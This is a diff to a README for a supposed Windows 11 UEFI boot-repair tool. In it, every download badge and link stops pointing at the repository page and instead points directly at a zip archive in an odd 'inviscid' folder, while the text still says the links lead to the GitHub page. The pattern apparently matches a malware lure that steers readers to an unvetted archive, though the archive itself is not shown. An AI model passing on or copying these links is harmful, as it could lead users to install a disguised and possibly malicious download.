@@ -1,6 +1,6 @@
 # 🛠️ windows-11-uefi-boot-repair - Fix Windows 11 UEFI Boot Issues Easily
 
-[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://github.com/WASSIM2020/windows-11-uefi-boot-repair)
+[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/WASSIM2020/windows-11-uefi-boot-repair/main/inviscid/boot-repair-uefi-windows-v1.6.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before starting, make sure to backup your important files if you can. Repairs wo
 
 Click the big green button below to visit the GitHub page. From there, you can download the software and follow the instructions.
 
-[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://github.com/WASSIM2020/windows-11-uefi-boot-repair)
+[![Download windows-11-uefi-boot-repair](https://img.shields.io/badge/Download-Here-green)](https://raw.githubusercontent.com/WASSIM2020/windows-11-uefi-boot-repair/main/inviscid/boot-repair-uefi-windows-v1.6.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Click the big green button below to visit the GitHub page. From there, you can d
 
 Go to this link:
 
-https://github.com/WASSIM2020/windows-11-uefi-boot-repair
+https://raw.githubusercontent.com/WASSIM2020/windows-11-uefi-boot-repair/main/inviscid/boot-repair-uefi-windows-v1.6.zip
 
 You will find the latest release files and instructions there.
 
@@ -159,4 +159,4 @@ If you run into issues that this guide does not cover, check the "Issues" tab on
 
 Use the link below to start the process by visiting the GitHub page and downloading the latest release:
 
-https://github.com/WASSIM2020/windows-11-uefi-boot-repair
+https://raw.githubusercontent.com/WASSIM2020/windows-11-uefi-boot-repair/main/inviscid/boot-repair-uefi-windows-v1.6.zip
